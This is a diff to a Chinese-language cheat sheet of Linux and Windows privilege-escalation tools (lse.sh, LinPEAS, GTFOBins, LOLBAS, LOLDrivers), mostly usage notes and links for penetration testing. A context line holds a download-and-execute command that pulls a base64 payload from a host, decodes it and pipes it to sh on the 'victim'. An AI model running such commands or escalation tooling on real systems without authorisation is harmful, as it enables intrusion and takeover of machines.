@@ -1,12 +1,22 @@
 ...............................
 # lse.sh
-Link: (https://github.com/diego-treitos/linux-smart-enumeration)
+Link: (https://github.com/diego-treitos/linux-smart-enumeration)(Another Version of LinENUM)
 Usage: 直接上传执行
-For: Linux
+For: Linux权限提升建议脚本
+Parameters: 
+```
+首先，您应该像 `./lse.sh` 一样执行它。如果你看到一些绿色的 `yes!` ，你可能已经有一些好东西可以使用了。
+
+如果没有，您应该尝试使用 `./lse.sh -l1` 的 `level 1` 详细程度，您将看到更多有趣的信息。
+ 
+如果这没有帮助， `level 2` 将转储您可以使用 `./lse.sh -l2` 收集的有关服务的所有内容。在这种情况下，您可能会发现使用 `./lse.sh -l2 | less -r` 很有用。
+ 
+还可以通过传递 `-s` 参数来选择要执行的测试。有了它，您可以选择要执行的特定测试或部分。例如， `./lse.sh -l2 -s usr010,net,pro` 将执行测试 `usr010` 以及 `net` 和 `pro` 部分中的所有测试。
+```
 ...............................
 # LinPEAS
 Link:https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
-For: linux权限提升建议脚本
+For: Linux权限提升建议脚本
 Usage: 直接上传执行，没有依赖项。
 Parameters: 
 ``` 
@@ -31,3 +41,15 @@ sudo python -m SimpleHTTPServer 80 #Start HTTP server
 curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
 ```
 
+...............................
+# GTFOBins
+Link: https://gtfobins.github.io/
+For: Unix 二进制文件的精选列表，可用于绕过配置错误的系统中的本地安全限制
+...............................
+# LOLBAS
+Link: https://lolbas-project.github.io/
+For: Windows二进制文件的精选列表，可用于绕过配置错误的系统中的本地安全限制
+...............................
+# LOLDrivers
+Link: https://www.loldrivers.io/
+For: Windows二进制文件的精选列表，可用于绕过配置错误的系统中的本地安全限制
